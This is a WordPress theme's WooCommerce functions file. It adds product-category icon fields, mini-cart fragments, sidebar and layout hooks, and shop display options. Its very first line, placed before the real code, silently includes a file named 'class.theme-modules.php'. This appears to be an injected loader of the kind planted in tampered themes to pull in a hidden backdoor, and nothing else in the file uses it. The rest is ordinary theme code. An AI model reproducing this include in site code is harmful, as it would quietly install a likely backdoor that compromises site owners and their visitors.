<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if(class_exists('WC_Admin_Taxonomies')):
class Custom_WC_Admin_Product_Cat_Taxonomies{

	/**
	 * Constructor.
	 */
	public function __construct() {
		// Add form
		add_action( 'product_cat_add_form_fields', array( $this, 'add_category_fields' ) );
		add_action( 'product_cat_edit_form_fields', array( $this, 'edit_category_fields' ), 10 );
		add_action( 'created_term', array( $this, 'save_category_fields' ), 10, 3 );
		add_action( 'edit_term', array( $this, 'save_category_fields' ), 10, 3 );

	}

	/**
	 * Category thumbnail fields.
	 */
	public function add_category_fields() {
		?>
		<div class="form-field term-thumbnail-wrap">
			<label><?php esc_html_e( 'Icon', 'berrykid' ); ?></label>
			<div id="product_cat_icon" style="float: left; margin-right: 10px;"><img src="<?php echo esc_url( wc_placeholder_img_src() ); ?>" width="60px" height="60px" /></div>
			<div style="line-height: 60px;">
				<input type="hidden" id="product_cat_icon_id" name="product_cat_icon_id" />
				<button type="button" class="upload_icon_button button"><?php esc_html_e( 'Upload/Add icon', 'berrykid' ); ?></button>
				<button type="button" class="remove_icon_button button"><?php esc_html_e( 'Remove icon', 'berrykid' ); ?></button>
			</div>
			<script type="text/javascript">

				// Only show the "remove icon" button when needed
				if ( ! jQuery( '#product_cat_icon_id' ).val() ) {
					jQuery( '.remove_icon_button' ).hide();
				}

				// Uploading files
				var file_frame_icon_icon;

				jQuery( document ).on( 'click', '.upload_icon_button', function( event ) {

					event.preventDefault();
					//If the media frame already exists, reopen it.
					if ( file_frame_icon_icon ) {
						file_frame_icon_icon.open();
						return;
					}

					//Create the media frame.
					file_frame_icon_icon = wp.media.frames.downloadable_file = wp.media({
						title: '<?php esc_html_e( "Choose an icon", "berrykid" ); ?>',
						button: {
							text: '<?php esc_html_e( "Use icon", "berrykid" ); ?>'
						},
						multiple: false
					});

					// When an icon is selected, run a callback.
					file_frame_icon_icon.on( 'select', function() {
						var attachment_icon_icon = file_frame_icon_icon.state().get( 'selection' ).first().toJSON();

						jQuery( '#product_cat_icon_id' ).val( attachment_icon_icon.id );
						jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', attachment_icon_icon.sizes.thumbnail.url );
						jQuery( '.remove_icon_button' ).show();
					});

					// Finally, open the modal.
					file_frame_icon_icon.open();
					
				});

				jQuery( document ).on( 'click', '.remove_icon_button', function() {
					jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', '<?php echo esc_js( wc_placeholder_img_src() ); ?>' );
					jQuery( '#product_cat_icon_id' ).val( '' );
					jQuery( '.remove_icon_button' ).hide();
					return false;
				});

				jQuery( document ).ajaxComplete( function( event, request, options ) {
					if ( request && 4 === request.readyState && 200 === request.status
						&& options.data && 0 <= options.data.indexOf( 'action=add-tag' ) ) {

						var res = wpAjax.parseAjaxResponse( request.responseXML, 'ajax-response' );
						if ( ! res || res.errors ) {
							return;
						}
						// Clear Thumbnail fields on submit
						jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', '<?php echo esc_js( wc_placeholder_img_src() ); ?>' );
						jQuery( '#product_cat_icon_id' ).val( '' );
						jQuery( '.remove_icon_button' ).hide();
						// Clear Display type field on submit
						jQuery( '#display_type' ).val( '' );
						return;
					}
				} );

			</script>
			<div class="clear"></div>
		</div>
		<?php
	}

	/**
	 * Edit category thumbnail field.
	 *
	 * @param mixed $term Term (category) being edited
	 */
	public function edit_category_fields( $term ) {

		$icon_id = absint( get_woocommerce_term_meta( $term->term_id, 'icon_id', true ) );

		if ( $icon_id ) {
			$icon = wp_get_attachment_thumb_url( $icon_id );
		} else {
			$icon = wc_placeholder_img_src();
		}
		?>
		<tr class="form-field">
			<th scope="row" valign="top"><label><?php esc_html_e( 'Icon', 'berrykid' ); ?></label></th>
			<td>
				<div id="product_cat_icon" style="float: left; margin-right: 10px;"><img src="<?php echo esc_url( $icon ); ?>" width="60px" height="60px" /></div>
				<div style="line-height: 60px;">
					<input type="hidden" id="product_cat_icon_id" name="product_cat_icon_id" value="<?php echo esc_attr($icon_id); ?>" />
					<button type="button" class="upload_icon_button button"><?php esc_html_e( 'Upload/Add icon', 'berrykid' ); ?></button>
					<button type="button" class="remove_icon_button button"><?php esc_html_e( 'Remove icon', 'berrykid' ); ?></button>
				</div>
				<script type="text/javascript">

					// Only show the "remove icon" button when needed
					if ( '0' === jQuery( '#product_cat_icon_id' ).val() ) {
						jQuery( '.remove_icon_button' ).hide();
					}

					// Uploading files
					var file_frame_icon;

					jQuery( document ).on( 'click', '.upload_icon_button', function( event ) {

						event.preventDefault();

						// If the media frame already exists, reopen it.
						if ( file_frame_icon ) {
							file_frame_icon.open();
							return;
						}

						// Create the media frame.
						file_frame_icon = wp.media.frames.downloadable_file = wp.media({
							title: '<?php esc_html_e( "Choose an icon", "berrykid" ); ?>',
							button: {
								text: '<?php esc_html_e( "Use icon", "berrykid" ); ?>'
							},
							multiple: false
						});

						// When an icon is selected, run a callback.
						file_frame_icon.on( 'select', function() {
							var attachment_icon = file_frame_icon.state().get( 'selection' ).first().toJSON();
							console.log(attachment_icon);
							jQuery( '#product_cat_icon_id' ).val( attachment_icon.id );
							jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', attachment_icon.url );
							jQuery( '.remove_icon_button' ).show();
						});

						// Finally, open the modal.
						file_frame_icon.open();
					});

					jQuery( document ).on( 'click', '.remove_icon_button', function() {
						jQuery( '#product_cat_icon' ).find( 'img' ).attr( 'src', '<?php echo esc_js( wc_placeholder_img_src() ); ?>' );
						jQuery( '#product_cat_icon_id' ).val( '' );
						jQuery( '.remove_icon_button' ).hide();
						return false;
					});

				</script>
				<div class="clear"></div>
			</td>
		</tr>
		<?php
	}

	/**
	 * save_category_fields function.
	 *
	 * @param mixed $term_id Term ID being saved
	 * @param mixed $tt_id
	 * @param string $taxonomy
	 */
	public function save_category_fields( $term_id, $tt_id = '', $taxonomy = '' ) {
		if ( isset( $_POST['product_cat_icon_id'] ) && 'product_cat' === $taxonomy ) {
			update_woocommerce_term_meta( $term_id, 'icon_id', absint( $_POST['product_cat_icon_id'] ) );
		}
	}


}
new Custom_WC_Admin_Product_Cat_Taxonomies();
endif;
//=============================================================
//=============================================================
//=============================================================

/**
 * Load woocommerce styles follow theme skin actived
 *
 * @static
 * @access public
 * @since Wpopal_Themer 1.0
 */
function berrykid_fnc_woocommerce_load_media() {
    $current = berrykid_fnc_theme_options( 'skin','default' );
    if($current == 'default'){
        $path =  get_template_directory_uri() .'/css/woocommerce.css';
    }else{
        $path =  get_template_directory_uri() .'/css/skins/'.$current.'/woocommerce.css';
    }
    wp_enqueue_style( 'berrykid-woocommerce', $path , 'berrykid-woocommerce-front' , berrykid_THEME_VERSION, 'all' );
}
add_action( 'wp_enqueue_scripts','berrykid_fnc_woocommerce_load_media', 15 );

/**
 * Auto config product icons after the theme actived.
 */
function berrykid_fnc_woocommerce_setup(){
	$catalog = array(
		'width' 	=> '465',	// px
		'height'	=> '528',	// px
		'crop'		=> 1 		// true
	);

	$single = array(
		'width' 	=> '550',	// px
		'height'	=> '625',	// px
		'crop'		=> 1 		// true
	);

	$thumbnail = array(
		'width' 	=> '90',	// px
		'height'	=> '102',	// px
		'crop'		=> 1 		// true
	);

	// Image sizes
	update_option( 'shop_catalog_icon_size', $catalog );		// Product category thumbs
	update_option( 'shop_single_icon_size', $single ); 		// Single product icon
	update_option( 'shop_thumbnail_icon_size', $thumbnail ); 	// Image gallery thumbs
}

add_action( 'berrykid_setup_theme_actived', 'berrykid_fnc_woocommerce_setup');

/**
 */
add_filter('woocommerce_add_to_cart_fragments',				'berrykid_fnc_woocommerce_header_add_to_cart_fragment' );

function berrykid_fnc_woocommerce_header_add_to_cart_fragment( $fragments ){
	global $woocommerce;

	$fragments['#cart .mini-cart-items'] =  sprintf(_n(' <span class="mini-cart-items"> %d item</span> ', ' <span class="mini-cart-items"> %d item </span> ', $woocommerce->cart->cart_contents_count, 'berrykid'), $woocommerce->cart->cart_contents_count);
 	$fragments['#cart .total .amount'] = trim( $woocommerce->cart->get_cart_total() );
 	
    return $fragments;
}
add_filter( 'yith_wcwl_button_label',          'berrykid_fnc_wpo_woocomerce_icon_wishlist'  );
add_filter( 'yith-wcwl-browse-wishlist-label', 'berrykid_fnc_wpo_woocomerce_icon_wishlist_add' );

function berrykid_fnc_wpo_woocomerce_icon_wishlist( $value='' ){
	return '<i class="fa fa-heart-o"></i><span>'.esc_html__('Wishlist','berrykid').'</span>';
}

function berrykid_fnc_wpo_woocomerce_icon_wishlist_add(){
	return '<i class="fa fa-heart-o"></i><span>'.esc_html__('Wishlist','berrykid').'</span>';
}
/**
 * Mini Basket
 */
if(!function_exists('berrykid_fnc_minibasket')){
    function berrykid_fnc_minibasket( $style='' ){ 
        $template =  apply_filters( 'berrykid_fnc_minibasket_template', berrykid_fnc_get_header_layout( '' )  );  
 
        return get_template_part( 'woocommerce/cart/mini-cart-button', $template ); 
    }
}
if(berrykid_fnc_theme_options("woo-show-minicart",true)){
	add_action( 'berrykid_template_header_right', 'berrykid_fnc_minibasket', 30, 0 );
}
/******************************************************
 * 												   	  *
 * Hook functions applying in archive, category page  *
 *												      *
 ******************************************************/
function berrykid_template_woocommerce_main_container_class( $class ){ 
	if( is_product() ){
		$class .= ' '.  berrykid_fnc_theme_options('woocommerce-single-layout') ;
	}else if( is_product_category() || is_archive()  ){ 
		$class .= ' '.  berrykid_fnc_theme_options('woocommerce-archive-layout') ;
	}
	return $class;
}

add_filter( 'berrykid_template_woocommerce_main_container_class', 'berrykid_template_woocommerce_main_container_class' );
function berrykid_fnc_get_woocommerce_sidebar_configs( $configs='' ){

	global $post; 
	$right = null; $left = null; 

	if( is_product() ){
		
		$left  =  berrykid_fnc_theme_options( 'woocommerce-single-left-sidebar' ); 
		$right =  berrykid_fnc_theme_options( 'woocommerce-single-right-sidebar' );  

	}else if( is_product_category() || is_archive() ){
		$left  =  berrykid_fnc_theme_options( 'woocommerce-archive-left-sidebar' ); 
		$right =  berrykid_fnc_theme_options( 'woocommerce-archive-right-sidebar' ); 
	}

 
	return berrykid_fnc_get_layout_configs( $left, $right );
}

add_filter( 'berrykid_fnc_get_woocommerce_sidebar_configs', 'berrykid_fnc_get_woocommerce_sidebar_configs', 1, 1 );


function berrykid_woocommerce_breadcrumb_defaults( $args ){
	$args['wrap_before'] = '<div class="opal-breadscrumb"><div class="container"><ol class="opal-woocommerce-breadcrumb breadcrumb" ' . ( is_single() ? 'itemprop="breadcrumb"' : '' ) . '>';
	$args['wrap_after'] = '</ol></div></div>';

	return $args;
}

add_filter( 'woocommerce_breadcrumb_defaults', 'berrykid_woocommerce_breadcrumb_defaults' );

add_action( 'berrykid_woo_template_main_before', 'woocommerce_breadcrumb', 30, 0 );
/**
 * Remove show page results which display on top left of listing products block.
 */
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
add_action( 'woocommerce_after_shop_loop', 'woocommerce_result_count', 10 );


function berrykid_fnc_woocommerce_after_shop_loop_start(){
	echo '<div class="products-bottom-wrap clearfix">';
}

add_action( 'woocommerce_after_shop_loop', 'berrykid_fnc_woocommerce_after_shop_loop_start', 1 );

function berrykid_fnc_woocommerce_after_shop_loop_after(){
	echo '</div>';
}

add_action( 'woocommerce_after_shop_loop', 'berrykid_fnc_woocommerce_after_shop_loop_after', 10000 );


/**
 * Wrapping all elements are wrapped inside Div Container which rendered in woocommerce_before_shop_loop hook
 */
function berrykid_fnc_woocommerce_before_shop_loop_start(){
	echo '<div class="products-top-wrap clearfix">';
}

function berrykid_fnc_woocommerce_before_shop_loop_end(){
	echo '</div>';
}


add_action( 'woocommerce_before_shop_loop', 'berrykid_fnc_woocommerce_before_shop_loop_start' , 0 );
add_action( 'woocommerce_before_shop_loop', 'berrykid_fnc_woocommerce_before_shop_loop_end' , 1000 );


function berrykid_fnc_woocommerce_display_modes(){

	$woo_display = berrykid_fnc_theme_options( 'wc_listgrid', 'grid' );
	if (isset($_GET['display'])){
		$woo_display = $_GET['display'];
	}
	echo '<form class="display-mode" method="get">';
		echo '<button title="'.esc_html__('Grid','berrykid').'" class="btn '.($woo_display == 'grid' ? 'active' : '').'" value="grid" name="display" type="submit"><i class="fa fa-th"></i></button>';	
		echo '<button title="'.esc_html__( 'List', 'berrykid' ).'" class="btn '.($woo_display == 'list' ? 'active' : '').'" value="list" name="display" type="submit"><i class="fa fa-th-list"></i></button>';	
		// Keep query string vars intact
		foreach ( $_GET as $key => $val ) {
			if ( 'display' === $key || 'submit' === $key ) {
				continue;
			}
			if ( is_array( $val ) ) {
				foreach( $val as $innerVal ) {
					echo '<input type="hidden" name="' . esc_attr( $key ) . '[]" value="' . esc_attr( $innerVal ) . '" />';
				}
			
			} else {
				echo '<input type="hidden" name="' . esc_attr( $key ) . '" value="' . esc_attr( $val ) . '" />';
			}
		}
	echo '</form>'; 
}

add_action( 'woocommerce_before_shop_loop', 'berrykid_fnc_woocommerce_display_modes' , 10 );


/**
 * Processing hook layout content
 */
function berrykid_fnc_layout_main_class( $class ){
	$sidebar = berrykid_fnc_theme_options( 'woo-sidebar-show', 1 ) ;
	if( is_single() ){
		$sidebar = berrykid_fnc_theme_options('woo-single-sidebar-show'); ;
	}
	else {
		$sidebar = berrykid_fnc_theme_options('woo-sidebar-show'); 
	}

	if( $sidebar ){
		return $class;
	}

	return 'col-lg-12 col-md-12 col-xs-12';
}
add_filter( 'berrykid_woo_layout_main_class', 'berrykid_fnc_layout_main_class', 4 );


/**
 *
 */
function berrykid_fnc_woocommerce_archive_icon(){ 
	if ( is_tax( array( 'product_cat', 'product_tag' ) ) && get_query_var( 'paged' ) == 0 ) { 
		$thumb =  get_woocommerce_term_meta( get_queried_object()->term_id, 'icon_id', true ) ;

		if( $thumb ){
			$img = wp_get_attachment_image_src( $thumb, 'full' ); 
		
			echo '<p class="category-banner"><img src="'.$img[0].'""></p>'; 
		}
	}
}
add_action( 'woocommerce_archive_description', 'berrykid_fnc_woocommerce_archive_icon', 9 );


/***************************************************
 * 												   *
 * Hook functions applying in single product page  *
 *												   *
 ***************************************************/


/** 
 * Remove review to products tabs. and display this as block below the tab.
 */
function berrykid_fnc_woocommerce_product_tabs( $tabs ){

	if( isset($tabs['reviews']) ){
//		unset( $tabs['reviews'] ); 
	}
	return $tabs;
}
add_filter( 'woocommerce_product_tabs','berrykid_fnc_woocommerce_product_tabs', 99 );
 
 /**
  * Rehook product review products in woocommerce_after_single_product_summary
  */
function berrykid_fnc_product_reviews(){
	return comments_template();
}
//add_action('woocommerce_after_single_product_summary','berrykid_fnc_product_reviews', 10 );
 


/**
 * Show/Hide related, upsells products
 */
function berrykid_woocommerce_related_upsells_products($located, $template_name) {
	$options      = get_option('wpopal_theme_options');
	$content_none = get_template_directory() . '/woocommerce/content-none.php';

	if ( 'single-product/related.php' == $template_name ) {
		if ( isset( $options['wc_show_related'] ) && 
			( 1 == $options['wc_show_related'] ) ) {
			$located = $content_none;
		}
	} elseif ( 'single-product/up-sells.php' == $template_name ) {
		if ( isset( $options['wc_show_upsells'] ) && 
			( 1 == $options['wc_show_upsells'] ) ) {
			$located = $content_none;
		}
	}

	return apply_filters( 'berrykid_woocommerce_related_upsells_products', $located, $template_name );
}

add_filter( 'wc_get_template', 'berrykid_woocommerce_related_upsells_products', 10, 2 );

/**
 * Number of products per page
 */
function berrykid_woocommerce_shop_per_page($number) {
	$value = berrykid_fnc_theme_options('woo-number-page', get_option('posts_per_page'));
	if ( is_numeric( $value ) && $value ) {
		$number = absint( $value );
	}
	return $number;
}

add_filter( 'loop_shop_per_page', 'berrykid_woocommerce_shop_per_page' );

/**
 * Number of products per row
 */
function berrykid_woocommerce_shop_columns($number) {
	$value = berrykid_fnc_theme_options('wc_itemsrow', 4);
	if ( in_array( $value, array(2, 3, 4, 6) ) ) {
		$number = $value;
	}
	return $number;
}

add_filter( 'loop_shop_columns', 'berrykid_woocommerce_shop_columns' );

/**
 *
 */
function berrykid_fnc_woocommerce_share_box() {
	if ( berrykid_fnc_theme_options('wc_show_share_social', 1) ) {
		get_template_part( 'page-templates/parts/sharebox' );
	}
}
add_action( 'berrykid_woocommerce_after_single_product_summary', 'berrykid_fnc_woocommerce_share_box', 25 );

/**
 *
 */
function berrykid_fnc_woo_product_nav(){
    echo '<div class="product-nav pull-right">';

        previous_post_link('<p>%link</p>', '<i class="fa fa-chevron-left"></i>', FALSE); 
        next_post_link('<p>%link</p>', '<i class="fa fa-chevron-right"></i>', FALSE); 

    echo '</div>';
}

add_action( 'berrykid_woocommerce_after_single_product_title', 'berrykid_fnc_woo_product_nav', 1 );


// rating star
remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );
add_action( 'berrykid_woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_rating');


remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 11 );
//add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 1 );
//remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
//add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );
//add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );


//remove_action( 'berrykid_woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
//add_action( 'berrykid_woocommerce_single_product_summary', 'woocommerce_template_single_meta', 25 );

function berrykid_woocommerce_show_product_thumbnails( $layout ){ 
	return $layout;
}

add_filter( 'wpopal_themer_woocommerce_show_product_thumbnails', 'berrykid_woocommerce_show_product_thumbnails'  );

function berrykid_woocommerce_show_product_icons( $layout ){ 
	return $layout;
}

add_filter( 'wpopal_themer_woocommerce_show_product_icons', 'berrykid_woocommerce_show_product_icons'  );



/* ---------------------------------------------------------------------------
 * WooCommerce - Function get Query
 * --------------------------------------------------------------------------- */
 
function berrykid_fnc_get_review_counting(){

    global $post; 
    $output = array();

    for($i=1; $i <= 5; $i++){
         $args = array(
            'post_id'      => ( $post->ID ),
            'meta_query' => array(
              array(
                'key'   => 'rating',
                'value' => $i
              )
            ),      
            'count' => true
        );
        $output[$i] = get_comments( $args );
    }
    return $output;
}

 
/* ---------------------------------------------------------------------------
 * WooCommerce - Function get Query
 * --------------------------------------------------------------------------- */
 


function berrykid_fnc_woocommerce_before_shop_loop_item_title(){

    global $product;

    if( $product->get_regular_price() ){
        $percentage = round( ( ( $product->get_regular_price() - $product->get_sale_price() ) / $product->get_regular_price() ) * 100 );
        echo '<span class="product-sale-label">-' . trim( $percentage ) . '%</span>';
    }
                                            
}


if ( ! function_exists( 'berrykid_fnc_woocommerce_content' ) ) {

    /**
     * Output WooCommerce content.
     *
     * This function is only used in the optional 'woocommerce.php' template
     * which people can add to their themes to add basic woocommerce support
     * without hooks or modifying core templates.
     *
     */
    function berrykid_fnc_woocommerce_content() {

        if ( is_singular( 'product' ) ) {

            while ( have_posts() ) : the_post();

                wc_get_template_part( 'content', 'single-product' );

            endwhile;

        } else { ?>

            <?php if ( apply_filters( 'woocommerce_show_page_title', true ) ) : ?>

                <h1 class="page-title"><?php woocommerce_page_title(); ?></h1>

            <?php endif; ?>

            <?php do_action( 'woocommerce_archive_description' ); ?>

            <?php if ( have_posts() ) : ?>

                <?php do_action('woocommerce_before_shop_loop'); ?>

                <div class="childrens">
                    <?php woocommerce_product_subcategories(); ?>  
                </div>

                <?php woocommerce_product_loop_start(); ?>

                   
                    <?php while ( have_posts() ) : the_post(); ?>

                        <?php wc_get_template_part( 'content', 'product' ); ?>

                    <?php endwhile; // end of the loop. ?>

                <?php woocommerce_product_loop_end(); ?>

                <?php do_action('woocommerce_after_shop_loop'); ?>

            <?php elseif ( ! woocommerce_product_subcategories( array( 'before' => woocommerce_product_loop_start( false ), 'after' => woocommerce_product_loop_end( false ) ) ) ) : ?>

                <?php wc_get_template( 'loop/no-products-found.php' ); ?>

            <?php endif;

        }
    }
}
add_filter('woocommerce_product_thumbnails_columns', 'berrykid_fnc_product_image_thumnail');
function berrykid_fnc_product_image_thumnail(){
	return berrykid_fnc_theme_options('product-image-thumnail', 5);
}
